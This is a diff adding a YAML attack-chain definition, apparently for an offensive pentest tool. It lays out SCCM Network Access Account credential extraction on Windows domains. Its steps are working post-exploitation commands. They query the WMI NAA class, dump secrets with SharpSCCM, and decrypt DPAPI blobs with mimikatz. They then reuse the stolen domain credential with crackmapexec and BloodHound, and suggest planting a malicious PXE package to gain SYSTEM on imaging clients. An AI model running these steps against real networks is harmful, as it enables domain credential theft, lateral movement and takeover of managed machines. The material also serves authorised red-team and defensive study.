@@ -1,0 +1,67 @@
+chain_id: sccm_naa_extraction
+title: "SCCM — Network Access Account credentials extraction → domain creds"
+severity: HIGH
+tags: [ad, sccm, mecm, naa, dpapi, sharpsccm, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "sccm_client_present" }
+    - { banner_pattern: "(?i)sccm|configmgr|mecm|software\\s*center" }
+    - { path_pattern: "(?i)/CCM_Client|/SMS_MP" }
+
+description: |
+  SCCM (now MECM) uses Network Access Accounts (NAA) so unjoined
+  clients can fetch packages from the distribution point. Every SCCM
+  client caches the NAA's DPAPI-encrypted credentials in the WMI
+  `CCM_NetworkAccessAccount` class. With local SYSTEM (or even local
+  admin via DPAPI) you can decrypt them — they're typically
+  domain-privileged because they need read on every package share.
+  Day-2 lateral move on Windows-managed networks.
+
+steps:
+  - id: 1
+    title: "Detect SCCM client"
+    command: |
+      reg query "HKLM\\Software\\Microsoft\\CCM" /v SiteCode 2>nul
+      sc.exe query CcmExec
+      Get-WmiObject -Namespace 'root\\ccm\\policy\\machine\\actualconfig' -Class CCM_NetworkAccessAccount
+
+  - id: 2
+    title: "Pull NAA blobs with SharpSCCM"
+    command: |
+      # On the foothold:
+      .\\SharpSCCM.exe local secrets
+      # Output: Username=DOMAIN\\svc_naa  Password=<plaintext>
+
+  - id: 3
+    title: "Manual path — WMI + DPAPI"
+    command: |
+      gwmi -Namespace root\\ccm\\policy\\machine\\actualconfig -Class CCM_NetworkAccessAccount
+      # Decrypt the NetworkAccessUsername / NetworkAccessPassword
+      # blobs with mimikatz:
+      mimikatz "privilege::debug" "token::elevate" "dpapi::ng /raw:<blob>"
+
+  - id: 4
+    title: "Use the credential"
+    command: |
+      crackmapexec smb DC.DOMAIN -u svc_naa -p '<plain>' -d DOMAIN
+      bloodhound-python -u svc_naa -p '<plain>' -d DOMAIN -c All
+
+  - id: 5
+    title: "Bonus — site server takeover via NAA"
+    command: |
+      # NAA often has admin on the SCCM site server. Check:
+      crackmapexec smb SCCM01 -u svc_naa -p '<plain>' --shares
+      # If C$ access: drop a malicious PXE/MDT package → SYSTEM on every
+      # imaging client.
+
+common_errors:
+  - error: "WMI query returns no results"
+    solution: |
+      Modern Enhanced HTTP (no NAA needed) deployments don't cache
+      NAA blobs. Pivot to SCCM PXE password (CVE-2025-... family) or
+      Configuration Manager Client Push installation account abuse.
+
+references:
+  - https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
+  - https://github.com/Mayyhem/SharpSCCM
